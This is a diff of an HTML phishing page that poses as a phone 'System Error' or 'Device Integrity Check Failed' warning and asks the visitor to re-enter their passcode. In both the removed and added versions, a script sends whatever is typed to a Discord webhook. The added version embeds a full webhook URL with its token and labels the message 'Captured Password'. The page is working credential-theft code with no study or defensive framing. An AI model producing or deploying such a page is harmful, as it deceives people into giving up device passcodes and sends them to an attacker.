@@ -1,62 +1,75 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Device Warning</title>
-  <style>
-    body {
-      background-color: #000;
-      color: white;
-      font-family: sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
-    }
-    input {
-      padding: 10px;
-      font-size: 18px;
-      margin-top: 10px;
-      width: 200px;
-      text-align: center;
-    }
-    button {
-      margin-top: 20px;
-      padding: 10px 20px;
-      font-size: 16px;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>System Warning</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
+      Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    background: #f0f0f0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .container {
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    padding: 30px;
+    max-width: 350px;
+    width: 100%;
+    text-align: center;
+  }
+  input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    margin-top: 15px;
+    margin-bottom: 20px;
+    font-size: 18px;
+    border-radius: 10px;
+    border: 1px solid #ccc;
+  }
+  button {
+    background-color: #007aff;
+    color: white;
+    font-size: 18px;
+    padding: 12px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    width: 100%;
+  }
+  button:hover {
+    background-color: #0051a8;
+  }
+</style>
 </head>
 <body>
-  <h2>⚠️ Device Integrity Check Failed</h2>
-  <p>Your phone has detected suspicious behavior. To continue:</p>
-  <form id="phishForm">
-    <input type="password" id="input" placeholder="Enter Passcode" required />
-    <br>
-    <button type="submit">Continue</button>
-  </form>
+  <div class="container">
+    <h2>System Error</h2>
+    <p>Please re-enter your phone passcode to continue</p>
+    <input type="password" id="pass" placeholder="Enter Passcode" />
+    <button onclick="sendPassword()">Continue</button>
+  </div>
 
   <script>
-    document.getElementById("phishForm").addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const pass = document.getElementById("input").value;
-
-      const webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
-
-      await fetch(webhook, {
+    async function sendPassword() {
+      const password = document.getElementById("pass").value;
+      if(!password) {
+        alert("Please enter a passcode.");
+        return;
+      }
+      await fetch("https://discord.com/api/webhooks/https://discord.com/api/webhooks/1377312217661309101/vc0zeKjST5SKVvCuLbto30q93sLIcxtXBz0ZLcS1s_FDQOUFLf1vZ-fTCQsrLciL_W9Y", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `📲 **Passcode Entered:** ${pass}`
-        })
+        body: JSON.stringify({ content: `Captured Password: ${password}` })
       });
-
-      alert("Thank you. Your device is now secured.");
-      document.getElementById("phishForm").reset();
-    });
+      alert("Thank you. Processing...");
+    }
   </script>
 </body>
 </html>
